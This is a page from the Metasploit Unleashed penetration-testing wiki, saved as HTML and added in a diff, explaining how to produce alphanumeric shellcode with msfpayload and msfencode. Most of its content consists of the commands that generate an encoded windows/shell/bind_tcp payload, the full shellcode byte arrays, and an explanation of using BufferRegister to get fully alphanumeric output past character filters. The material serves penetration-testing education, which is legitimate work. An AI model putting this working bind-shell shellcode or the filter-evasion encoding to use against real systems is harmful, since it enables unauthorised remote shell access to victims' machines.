@@ -1,0 +1,786 @@
+
+		<!DOCTYPE html>
+		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
+		<head>
+			<title>Alphanumeric Shellcode - Metasploit Unleashed</title>
+			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
+			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
+			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
+			<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+		</head>
+
+		<body>
+			<div id="wrapper">
+			
+				<div id="header">
+					<div id="header-content">
+						<h1><a style="color:#F0F0F0" href="index.html">Metasploit Unleashed</a></h1>
+						<div class="tagline">Mastering the Framework</div>
+						<div class="clear"></div>
+					</div>
+				</div>
+				
+				<div id="page">
+					<div id="right-box">
+						
+						<div id="controls">
+									<ul>
+			<li id="ca-nstab-main" class="selected"><a href="Alphanumeric_Shellcode" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Alphanumeric_Shellcode&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Alphanumeric_Shellcode&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Alphanumeric_Shellcode&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+		</ul>
+							
+							<div class="portlet" id="p-personal">
+								<div class="pBody">
+								<ul>
+																	</ul>
+								</div>
+							</div>
+							
+							<div class="search">
+									<div id="p-search" class="portlet">
+		<div id="searchBody" class="pBody">
+			<form action="http://www.offensive-security.com/w/index.php" id="searchform">
+				<input type='hidden' name="title" value="Special:Search"/>
+				<input type="search" name="search" title="Search Metasploit Unleashed [f]" accesskey="f" id="searchInput" />
+				<input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchGoButton" class="searchButton" />&#160;
+				<input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton" />
+			</form>
+		</div>
+	</div>
+							</div>
+							
+							<div class="clear"></div>
+						</div>
+					
+						<a id="top"></a>
+						
+						<div id="content">
+							<h1>Alphanumeric Shellcode</h1>
+						
+							<div id="siteSub">From Metasploit Unleashed</div>
+							<div id="contentSub"></div>
+																													<div id="jump-to-nav">Jump to: <a href="Alphanumeric_Shellcode#column-one">navigation</a>, <a href="Alphanumeric_Shellcode#searchInput">search</a></div>
+														<!-- start content -->
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>There are cases where you need to obtain a pure alphanumeric shellcode because of character filtering in the exploited application. MSF can generate alphanumeric shellcode easily through <a href="Msfencode" title="Msfencode">Msfencode</a>. For example, to generate a mixed alphanumeric uppercase and lowercase encoded shellcode, we can use the following command:
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfpayload windows/shell/bind_tcp R | ./msfencode -e x86/alpha_mixed</span>
+[*] x86/alpha_mixed succeeded with size 659 (iteration=1)
+
+unsigned char buf[] =
+"\x89\xe2\xdb\xdb\xd9\x72\xf4\x59\x49\x49\x49\x49\x49\x49\x49"
+"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
+"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
+"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
+"\x4c\x4d\x38\x4c\x49\x45\x50\x45\x50\x45\x50\x43\x50\x4d\x59"
+"\x4d\x35\x50\x31\x49\x42\x42\x44\x4c\x4b\x50\x52\x50\x30\x4c"
+"\x4b\x51\x42\x44\x4c\x4c\x4b\x51\x42\x45\x44\x4c\x4b\x44\x32"
+"\x51\x38\x44\x4f\x4e\x57\x50\x4a\x47\x56\x46\x51\x4b\x4f\x50"
+"\x31\x49\x50\x4e\x4c\x47\x4c\x43\x51\x43\x4c\x45\x52\x46\x4c"
+"\x47\x50\x49\x51\x48\x4f\x44\x4d\x43\x31\x48\x47\x4b\x52\x4a"
+"\x50\x51\x42\x50\x57\x4c\x4b\x46\x32\x42\x30\x4c\x4b\x47\x32"
+"\x47\x4c\x45\x51\x4e\x30\x4c\x4b\x47\x30\x44\x38\x4d\x55\x49"
+"\x50\x44\x34\x50\x4a\x45\x51\x48\x50\x50\x50\x4c\x4b\x50\x48"
+"\x44\x58\x4c\x4b\x51\x48\x51\x30\x43\x31\x4e\x33\x4b\x53\x47"
+"\x4c\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4e\x36\x50\x31"
+"\x4b\x4f\x46\x51\x49\x50\x4e\x4c\x49\x51\x48\x4f\x44\x4d\x45"
+"\x51\x49\x57\x50\x38\x4d\x30\x42\x55\x4c\x34\x45\x53\x43\x4d"
+"\x4c\x38\x47\x4b\x43\x4d\x51\x34\x43\x45\x4b\x52\x51\x48\x4c"
+"\x4b\x51\x48\x47\x54\x45\x51\x49\x43\x42\x46\x4c\x4b\x44\x4c"
+"\x50\x4b\x4c\x4b\x50\x58\x45\x4c\x43\x31\x48\x53\x4c\x4b\x43"
+"\x34\x4c\x4b\x43\x31\x48\x50\x4c\x49\x50\x44\x51\x34\x51\x34"
+"\x51\x4b\x51\x4b\x45\x31\x46\x39\x51\x4a\x50\x51\x4b\x4f\x4b"
+"\x50\x51\x48\x51\x4f\x51\x4a\x4c\x4b\x44\x52\x4a\x4b\x4b\x36"
+"\x51\x4d\x43\x58\x50\x33\x50\x32\x43\x30\x43\x30\x42\x48\x43"
+"\x47\x43\x43\x50\x32\x51\x4f\x50\x54\x43\x58\x50\x4c\x43\x47"
+"\x51\x36\x43\x37\x4b\x4f\x4e\x35\x4e\x58\x4a\x30\x43\x31\x45"
+"\x50\x45\x50\x51\x39\x49\x54\x50\x54\x46\x30\x43\x58\x46\x49"
+"\x4b\x30\x42\x4b\x45\x50\x4b\x4f\x4e\x35\x50\x50\x50\x50\x50"
+"\x50\x46\x30\x51\x50\x46\x30\x51\x50\x46\x30\x43\x58\x4a\x4a"
+"\x44\x4f\x49\x4f\x4d\x30\x4b\x4f\x48\x55\x4d\x47\x50\x31\x49"
+"\x4b\x51\x43\x45\x38\x43\x32\x45\x50\x44\x51\x51\x4c\x4d\x59"
+"\x4d\x36\x42\x4a\x44\x50\x50\x56\x51\x47\x42\x48\x48\x42\x49"
+"\x4b\x46\x57\x43\x57\x4b\x4f\x48\x55\x51\x43\x50\x57\x45\x38"
+"\x48\x37\x4b\x59\x46\x58\x4b\x4f\x4b\x4f\x4e\x35\x50\x53\x46"
+"\x33\x50\x57\x45\x38\x43\x44\x4a\x4c\x47\x4b\x4b\x51\x4b\x4f"
+"\x49\x45\x51\x47\x4c\x57\x43\x58\x44\x35\x42\x4e\x50\x4d\x43"
+"\x51\x4b\x4f\x4e\x35\x42\x4a\x43\x30\x42\x4a\x45\x54\x50\x56"
+"\x51\x47\x43\x58\x45\x52\x48\x59\x49\x58\x51\x4f\x4b\x4f\x4e"
+"\x35\x4c\x4b\x47\x46\x42\x4a\x51\x50\x43\x58\x45\x50\x42\x30"
+"\x43\x30\x45\x50\x46\x36\x43\x5a\x45\x50\x45\x38\x46\x38\x49"
+"\x34\x46\x33\x4a\x45\x4b\x4f\x49\x45\x4d\x43\x46\x33\x42\x4a"
+"\x45\x50\x50\x56\x50\x53\x50\x57\x45\x38\x44\x42\x49\x49\x49"
+"\x58\x51\x4f\x4b\x4f\x4e\x35\x43\x31\x48\x43\x47\x59\x49\x56"
+"\x4d\x55\x4c\x36\x43\x45\x4a\x4c\x49\x53\x44\x4a\x41\x41";</pre>
+<br />
+If you look deeper at the generated shellcode, you will see that there are some non alphanumeric characters though:
+<br />
+<br />
+<pre>>>> <span style='color:#13C16A;'>print shellcode</span>
+???t$?^VYIIIIIIIIICCCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLCZJKPMKXKIKOKOKOE0LKBLQ4Q4LKQUGLLKCLC5CHEQJOLKPOB8LKQOGPC1
+JKPILKGDLKC1JNP1IPLYNLK4IPD4EWIQHJDMC1IRJKKDGKPTQ4GXCEKULKQOFDC1JKE6LKDLPKLKQOELEQJKDCFLLKMYBLFDELE1HCP1IKE4LKG3P0LKG0D
+LLKBPELNMLKG0C8QNBHLNPNDNJLF0KOHVBFPSCVE8P3GBBHD7BSGBQOF4KOHPE8HKJMKLGKPPKON6QOK9M5CVMQJMEXC2QEBJERKOHPCXIIEYKENMQGKON6
+QCQCF3PSF3G3PSPCQCKOHPBFCXB1QLE6QCMYM1J5BHNDDZD0IWF7KOIFCZDPPQQEKON0E8NDNMFNJIPWKOHVQCF5KON0BHJEG9LFQYF7KOIFF0PTF4QEKOH
+PJ3E8JGCIHFBYF7KON6PUKOHPBFCZE4E6E8BCBMK9M5BJF0PYQ9HLMYKWBJG4MYM2FQIPL3NJKNQRFMKNPBFLJ3LMCJGHNKNKNKBHCBKNNSDVKOCEQTKOHV
+QKQGPRF1PQF1CZEQPQPQPUF1KOHPE8NMN9DEHNF3KOIFCZKOKOFWKOHPLKQGKLLCITE4KOHVF2KOHPCXJPMZDDQOF3KOHVKOHPDJAA</pre>
+<br />
+This is due to the opcodes ("\x89\xe2\xdb\xdb\xd9\x72") at the beginning of the payload which are needed in order to find the payloads absolute location in memory and obtain a fully position-independent shellcode:
+<br />
+<br />
+Once our shellcode address is obtained through the first two instructions, it is pushed onto the stack and stored in the ECX register which will then be used to calculate relative offsets. However, if we are able somehow to obtain the absolute position of the shellcode on our own and save that address in a register before running the shellcode, we can use the special option BufferRegister=REG32 while encoding our payload:
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfpayload windows/shell/bind_tcp R | ./msfencode BufferRegister=ECX -e x86/alpha_mixed</span>
+[*] x86/alpha_mixed succeeded with size 651 (iteration=1)
+
+unsigned char buf[] =
+"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
+"\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
+"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
+"\x38\x41\x42\x75\x4a\x49\x4b\x4c\x4d\x38\x4c\x49\x43\x30\x43"
+"\x30\x45\x50\x45\x30\x4c\x49\x4b\x55\x50\x31\x48\x52\x43\x54"
+"\x4c\x4b\x51\x42\x50\x30\x4c\x4b\x50\x52\x44\x4c\x4c\x4b\x50"
+"\x52\x45\x44\x4c\x4b\x44\x32\x46\x48\x44\x4f\x48\x37\x50\x4a"
+"\x46\x46\x50\x31\x4b\x4f\x46\x51\x49\x50\x4e\x4c\x47\x4c\x43"
+"\x51\x43\x4c\x45\x52\x46\x4c\x47\x50\x49\x51\x48\x4f\x44\x4d"
+"\x43\x31\x49\x57\x4b\x52\x4a\x50\x51\x42\x51\x47\x4c\x4b\x51"
+"\x42\x42\x30\x4c\x4b\x50\x42\x47\x4c\x43\x31\x48\x50\x4c\x4b"
+"\x51\x50\x42\x58\x4b\x35\x49\x50\x43\x44\x50\x4a\x43\x31\x48"
+"\x50\x50\x50\x4c\x4b\x51\x58\x45\x48\x4c\x4b\x50\x58\x47\x50"
+"\x43\x31\x49\x43\x4a\x43\x47\x4c\x50\x49\x4c\x4b\x50\x34\x4c"
+"\x4b\x43\x31\x4e\x36\x50\x31\x4b\x4f\x46\x51\x49\x50\x4e\x4c"
+"\x49\x51\x48\x4f\x44\x4d\x45\x51\x49\x57\x47\x48\x4b\x50\x43"
+"\x45\x4c\x34\x43\x33\x43\x4d\x4c\x38\x47\x4b\x43\x4d\x46\x44"
+"\x42\x55\x4a\x42\x46\x38\x4c\x4b\x50\x58\x47\x54\x45\x51\x49"
+"\x43\x42\x46\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x48\x45\x4c"
+"\x45\x51\x4e\x33\x4c\x4b\x44\x44\x4c\x4b\x43\x31\x4e\x30\x4b"
+"\x39\x51\x54\x47\x54\x47\x54\x51\x4b\x51\x4b\x45\x31\x51\x49"
+"\x51\x4a\x46\x31\x4b\x4f\x4b\x50\x50\x58\x51\x4f\x50\x5a\x4c"
+"\x4b\x45\x42\x4a\x4b\x4b\x36\x51\x4d\x45\x38\x47\x43\x47\x42"
+"\x45\x50\x43\x30\x43\x58\x43\x47\x43\x43\x47\x42\x51\x4f\x50"
+"\x54\x43\x58\x50\x4c\x44\x37\x46\x46\x45\x57\x4b\x4f\x4e\x35"
+"\x48\x38\x4c\x50\x43\x31\x45\x50\x45\x50\x51\x39\x48\x44\x50"
+"\x54\x46\x30\x45\x38\x46\x49\x4b\x30\x42\x4b\x45\x50\x4b\x4f"
+"\x49\x45\x50\x50\x50\x50\x50\x50\x46\x30\x51\x50\x50\x50\x47"
+"\x30\x46\x30\x43\x58\x4a\x4a\x44\x4f\x49\x4f\x4d\x30\x4b\x4f"
+"\x4e\x35\x4a\x37\x50\x31\x49\x4b\x50\x53\x45\x38\x43\x32\x43"
+"\x30\x44\x51\x51\x4c\x4d\x59\x4b\x56\x42\x4a\x42\x30\x51\x46"
+"\x50\x57\x43\x58\x48\x42\x49\x4b\x50\x37\x43\x57\x4b\x4f\x49"
+"\x45\x50\x53\x50\x57\x45\x38\x4e\x57\x4d\x39\x47\x48\x4b\x4f"
+"\x4b\x4f\x48\x55\x51\x43\x46\x33\x46\x37\x45\x38\x42\x54\x4a"
+"\x4c\x47\x4b\x4b\x51\x4b\x4f\x4e\x35\x50\x57\x4c\x57\x42\x48"
+"\x42\x55\x42\x4e\x50\x4d\x45\x31\x4b\x4f\x49\x45\x42\x4a\x43"
+"\x30\x42\x4a\x45\x54\x50\x56\x50\x57\x43\x58\x44\x42\x4e\x39"
+"\x48\x48\x51\x4f\x4b\x4f\x4e\x35\x4c\x4b\x46\x56\x42\x4a\x47"
+"\x30\x42\x48\x45\x50\x44\x50\x43\x30\x43\x30\x50\x56\x43\x5a"
+"\x43\x30\x43\x58\x46\x38\x4e\x44\x50\x53\x4d\x35\x4b\x4f\x48"
+"\x55\x4a\x33\x46\x33\x43\x5a\x43\x30\x50\x56\x51\x43\x51\x47"
+"\x42\x48\x43\x32\x4e\x39\x48\x48\x51\x4f\x4b\x4f\x4e\x35\x43"
+"\x31\x48\x43\x51\x39\x49\x56\x4c\x45\x4a\x56\x43\x45\x4a\x4c"
+"\x49\x53\x45\x5a\x41\x41";</pre>
+<br />
+This time we obtained a pure alphanumeric shellcode:
+<br />
+<br />
+<pre>>>> <span style='color:#13C16A;'>print shellcode</span>
+IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLBJJKPMM8KIKOKOKOE0LKBLFDFDLKPEGLLKCLC5D8C1JOLKPOEHLKQOGPEQJKPILKGD
+LKEQJNFQIPMINLLDIPCDC7IQHJDMC1HBJKJTGKF4GTFHBUJELKQOGTC1JKCVLKDLPKLKQOELEQJKESFLLKLIBLFDELE1HCP1IKE4LKG3FPLKG0DLLKBPELN
+MLKG0DHQNE8LNPNDNJLPPKOHVE6QCE6CXP3FRE8CGCCP2QOPTKON0CXHKJMKLGKF0KOHVQOMYM5E6K1JMEXC2PUBJDBKON0CXN9C9KENMPWKON6QCF3F3F3
+PSG3PSPCQCKOHPBFE8DQQLBFPSMYKQMECXNDDZBPIWQGKOHVBJB0PQPUKOHPBHNDNMFNKYPWKON6QCF5KOHPCXKUG9K6QYQGKOHVF0QDF4QEKON0MCCXKWD
+9HFBYQGKOIFQEKON0BFCZBDE6CXCSBMMYJECZF0F9FIHLK9KWCZQTK9JBFQIPKCNJKNQRFMKNG2FLMCLMBZFXNKNKNKCXCBKNNSB6KOD5QTKON6QKF7QBF1
+PQF1BJC1F1F1PUPQKON0CXNMIIDEHNQCKOHVBJKOKOGGKOHPLKF7KLLCITBDKON6QBKOHPE8L0MZETQOQCKOHVKOHPEZAA</pre>
+<br />
+In this case, we told msfencode that we took care of finding the shellcodes absolute address and we saved it in the ECX register:
+<br />
+<br />
+As you can see in the previous image, ECX was previously set in order to point to the beginning of our shellcode. At this point, our payload starts directly realigning ECX to begin the shellcode decoding sequence. 
+<br />
+<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Exploit_Development" title="Exploit Development">Exploit Development</a> &gt; <a href="Exploit_Payloads" title="Exploit Payloads">Exploit Payloads</a> &gt; Alphanumeric Shellcode</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Msfvenom" title="Msfvenom">Msfvenom</a> &#124; <a href="Msfpayload" title="Msfpayload">Msfpayload</a> &#124; <a href="Msfencode" title="Msfencode">Msfencode</a> &#124; <strong class="selflink">Alphanumeric Shellcode</strong> &#124; <a href="Msfrop" title="Msfrop">Msfrop</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<!-- 
+NewPP limit report
+Preprocessor visited node count: 514/1000000
+Preprocessor generated node count: 2679/1000000
+Post‐expand include size: 4348/2097152 bytes
+Template argument size: 0/2097152 bytes
+Highest expansion depth: 3/40
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:103-0!*!0!*!*!*!* and timestamp 20131124034840 -->
+</div><div class="printfooter">
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Alphanumeric_Shellcode&amp;oldid=1592">http://www.offensive-security.com/w/index.php?title=Alphanumeric_Shellcode&amp;oldid=1592</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Exploit_Payloads&amp;action=edit&amp;redlink=1" class="new" title="Category:Exploit Payloads (page does not exist)">Exploit Payloads</a></li></ul></div></div>							<!-- end content -->
+													</div>
+						
+					</div>
+				
+					<div id="left-box">
+								<ul id="nav">
+				<li><a href="Donate" class="root">Donate</a></li>
+				<li>
+					<a href="Introduction" class="root"><span class="chapter">01</span> Introduction</a>
+					<div class="menu two-column">
+						<h3>Introduction</h3>
+						<ul class="one">
+							<li><a href="Metasploit_Architecture">Metasploit Architecture</a>
+								<ul class="two small">
+									<li><a href="Filesystem_And_Libraries">Filesystem And Libraries</a></li>
+									<li><a href="Modules_And_Locations">Modules And Locations</a></li>
+									<li><a href="Metasploit_Object_Model">Metasploit Object Model</a></li>
+									<li><a href="Mixins_And_Plugins">Mixins And Plugins</a></li>
+								</ul>
+							</li>
+						</ul>
+						<div class="clear"></div>
+					</div>
+				</li>
+				<li>
+					<a href="Requirements" class="root"><span class="chapter">02</span> Requirements</a>
+					<div class="menu two-column">
+						<h3>Required Materials</h3>
+						<ul class="one">
+							<li><a href="Metasploitable">Metasploitable</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Metasploit_Fundamentals" class="root"><span class="chapter">03</span>Metasploit Fundamentals</a>
+					<div class="menu four-column">
+						<h3>Metasploit Fundamentals</h3>
+						<ul class="one">
+							<li><a href="Msfcli">Msfcli</a></li>
+							<li><a href="Msfconsole">Msfconsole</a>
+								<ul class="two small">
+									<li><a href="Msfconsole_Commands">Msfconsole Commands</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Exploits">Exploits</a>
+								<ul class="two">
+									<li><a href="Using_Exploits">Using Exploits</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Payloads">Payloads</a>
+								<ul class="two small">
+									<li><a href="Payload_Types">Payload Types</a></li>
+									<li><a href="Generating_Payloads">Generating Payloads</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+                                                        <li><a href="Databases">Databases</a>
+                                                                <ul class="two small">
+                                                                        <li><a href="Using_the_Database">Using the Database</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+                                                        </li>
+							<li><a href="About_Meterpreter">About Meterpreter</a>
+								<ul class="two">
+									<li><a href="Meterpreter_Basics">Meterpreter Basics</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+						</ul>
+						<div class="clear"></div>
+					</div>
+				</li>
+				<li>
+				<a href="Information_Gathering" class="root"><span class="chapter">04</span> Information Gathering</a>
+					<div class="menu two-column">
+						<h3>Information Gathering</h3>
+						<ul class="one">
+							<li><a href="Port_Scanning">Port Scanning</a></li>
+							<li><a href="Hunting_For_MSSQL">Hunting For MSSQL</a></li>
+							<li><a href="Service_Identification">Service Identification</a></li>
+							<li><a href="Password_Sniffing">Password Sniffing</a>
+								<ul class="two">
+									<li><a href="Extending_Psnuffle">Extending Psnuffle</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="SNMP_Sweeping">SNMP Sweeping</a></li>
+							<li><a href="Writing_Your_Own_Scanner">Writing Your Own Scanner</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Vulnerability_Scanning" class="root"><span class="chapter">05</span> Vulnerability Scanning</a>
+					<div class="menu two-column">
+						<h3>Vulnerability Scanning</h3>
+						<ul class="one">
+							<li><a href="SMB_Login_Check">SMB Login Check</a></li>
+							<li><a href="VNC_Authentication">VNC Authentication</a></li>
+							<li><a href="WMAP_Web_Scanner">WMAP Web Scanner</a></li>
+							<li><a href="Working_With_NeXpose">Working With NeXpose</a>
+		     		                                <ul class="two small">
+                                                                        <li><a href="NeXpose_Via_Msfconsole">NeXpose Via Msfconsole</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+							</li>
+                                                        <li><a href="Working_With_Nessus">Working With Nessus</a>
+								<ul class="two small">
+									<li><a href="Nessus_Via_Msfconsole">Nessus Via Msfconsole</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Writing_A_Simple_Fuzzer" class="root"><span class="chapter">06</span> Writing A Simple Fuzzer</a>
+					<div class="menu two-column">
+						<h3>Writing a Simple Fuzzer</h3>
+						<ul class="one">
+							<li><a href="Simple_TFTP_Fuzzer">Simple TFTP Fuzzer</a></li>
+							<li><a href="Simple_IMAP_Fuzzer">Simple IMAP Fuzzer</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Exploit_Development" class="root"><span class="chapter">07</span> Exploit Development</a>
+					<div class="menu two-column">
+						<h3>Exploit Development</h3>
+						<ul class="one">
+							<li><a href="Exploit_Design_Goals">Exploit Design Goals</a></li>
+							<li><a href="Exploit_Format">Exploit Format</a></li>
+							<li><a href="Exploit_Mixins">Exploit Mixins</a></li>
+							<li><a href="Exploit_Targets">Exploit Targets</a></li>
+							<li><a href="Exploit_Payloads">Exploit Payloads</a>
+								<ul class="two small">
+									<li><a href="Msfvenom">Msfvenom</a></li>
+									<li><a href="Msfpayload">Msfpayload</a></li>
+									<li><a href="Msfencode">Msfencode</a></li>
+									<li><a href="Alphanumeric_Shellcode">Alphanumeric Shellcode</a></li>
+									<li><a href="Msfrop">Msfrop</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Writing_An_Exploit">Writing An Exploit</a>
+								<ul class="two small">
+									<li><a href="Getting_A_Shell">Getting A Shell</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Using_The_Egghunter_Mixin">Using The Egghunter Mixin</a>
+								<ul class="two small">
+									<li><a href="Completing_The_Exploit">Completing The Exploit</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Porting_Exploits">Porting Exploits</a></li>
+						</ul>
+					</div>
+				</li>
+                                <li>
+                                        <a href="Web_App_Exploit_Dev" class="root"><span class="chapter">08</span> Web App Exploit Dev</a>
+                                        <div class="menu two-column">
+                                                <h3>Client-side Exploits</h3>
+                                                <ul class="one">
+                                                        <li><a href="Installing_dotDefender">Installing dotDefender</a></li>
+                                                        <li><a href="Analyzing_the_Exploit">Analyzing the Exploit</a></li>
+                                                        <li><a href="Skeleton_Creation">Skeleton Creation</a></li>
+                                                        <li><a href="Making_A_Log_Entry">Making A Log Entry</a></li>
+                                                        <li><a href="Hosting_the_Javascript">Hosting the Javascript</a></li>
+                                                        <li><a href="Final_Exploit">Final Exploit</a></li>
+                                                </ul>
+                                        </div>
+                                </li>
+				<li>
+					<a href="Client_Side_Attacks" class="root"><span class="chapter">09</span> Client Side Attacks</a>
+					<div class="menu three-column">
+						<h3>Client Side Attacks</h3>
+						<ul class="one">
+							<li><a href="Binary_Payloads">Binary Payloads</a></li>
+							<ul class="two small">
+								<li><a href="Binary_Linux_Trojan">Binary Linux Trojan</a></li>
+							</ul>
+							<div class="clear"></div>
+							<li><a href="Client_Side_Exploits">Client Side Exploits</a></li>
+							<li><a href="VBScript_Infection_Methods">VBScript Infection Methods</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="MSF_Post_Exploitation" class="root"><span class="chapter">10</span> MSF Post Exploitation</a>
+					<div class="menu two-column">
+						<h3>MSF Post Exploitation</h3>
+						<ul class="one">
+							<li><a href="Privilege_Escalation">Privilege Escalation</a></li>
+							<li><a href="PSExec_Pass_The_Hash">PSExec Pass the Hash</a></li>
+							<li><a href="Event_Log_Management">Event Log Management</a></li>
+							<li><a href="Fun_With_Incognito">Fun with Incognito</a></li>
+							<li><a href="Interacting_With_The_Registry">Interacting with the Registry</a>
+								<ul class="two small">
+									<li><a href="Persistent_Netcat_Backdoor">Persistent Netcat Backdoor</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Enabling_Remote_Desktop">Enabling Remote Desktop</a></li>
+							<li><a href="Packet_Sniffing">Packet Sniffing</a></li>
+							<li><a href="Pivoting">Pivoting</a></li>
+                                                                <ul class="two small">
+                                                                        <li><a href="Portfwd">Portfwd</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+							<li><a href="TimeStomp">TimeStomp</a></li>
+							<li><a href="Screen_Capture">Screen Capture</a></li>
+							<li><a href="Searching_For_Content">Searching For Content</a></li>
+							<li><a href="John_The_Ripper">John The Ripper</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Meterpreter_Scripting" class="root"><span class="chapter">11</span> Meterpreter Scripting</a>
+					<div class="menu two-column">
+						<h3>Meterpreter Scripting</h3>
+						<ul class="one">
+							<li><a href="Existing_Scripts">Existing Scripts</a></li>
+							<li><a href="Writing_Meterpreter_Scripts">Writing Meterpreter Scripts</a></li>
+							<li><a href="Custom_Scripting">Custom Scripting</a></li>
+							<li><a href="Useful_API_Calls">Useful API Calls</a></li>
+							<li><a href="Useful_Functions">Useful Functions</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Maintaining_Access" class="root"><span class="chapter">12</span> Maintaining Access</a>
+					<div class="menu two-column">
+						<h3>Maintaining Access</h3>
+						<ul class="one">
+							<li><a href="Keylogging">Keylogging</a></li>
+							<li><a href="Meterpreter_Backdoor">Meterpreter Backdoor</a></li>
+							<li><a href="Persistent_Backdoors">Persistent Backdoors</a></li>
+						        <ul class="two small">
+								 <li><a href="Netcat_Backdoor">Netcat Backdoor</a></li>
+		 						 <li><a href="Meterpreter_Service">Meterpreter Service</a></li>
+							</ul>
+								 <div class="clear"></div>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="MSF_Extended_Usage" class="root"><span class="chapter">13</span> MSF Extended Usage</a>
+					<div class="menu two-column">
+						<h3>MSF Extended Usage</h3>
+						<ul class="one">
+							<li><a href="PHP_Meterpreter">PHP Meterpreter</a></li>
+							<li><a href="Backdooring_EXE_Files">Backdooring EXE Files</a></li>
+							<li><a href="Karmetasploit">Karmetasploit</a>
+								<ul class="two small">
+									<li><a href="Karmetasploit_Configuration">Configuration</a></li>
+									<li><a href="Karmetasploit_In_Action">Karmetasploit in Action</a></li>
+									<li><a href="Attack_Analysis">Attack Analysis</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="MSF_vs_OS_X">MSF vs OS X</a></li>
+							<li><a href="File-Upload_Backdoors">File-Upload Backdoors</a></li>
+							<li><a href="Building_A_Module">Building A Module</a>
+								<ul class="two small">
+									<li><a href="Payloads_Through_MSSQL">Payloads Through MSSQL</a></li>
+									<li><a href="Creating_Our_Auxiliary_Module">Creating Our Auxiliary Module</a></li>
+									<li><a href="The_Guts_Behind_It">The Guts Behind It</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+						</ul>
+					</div>
+				</li>
+				<li>
+                                        <a href="Metasploit_GUIs" class="root"><span class="chapter">14</span> Metasploit GUIs</a>
+					<div class="menu two-column">
+						<h3>Metasploit GUIs</h3>
+						<ul class="one">
+							<li><a href="MSF_Community_Edition">MSF Community Edition</a>
+								<ul class="two small">
+                                                                        <li><a href="Scanning">Scanning</a></li>
+                                                                        <li><a href="Exploitation">Exploitation</a></li>
+                                                                        <li><a href="Post_Exploitation">Post Exploitation</a></li>
+                                                                </ul>
+								<div class="clear"></div>
+                                                        </li>
+							<li><a href="Armitage">Armitage</a>
+                                                                <ul class="two small">
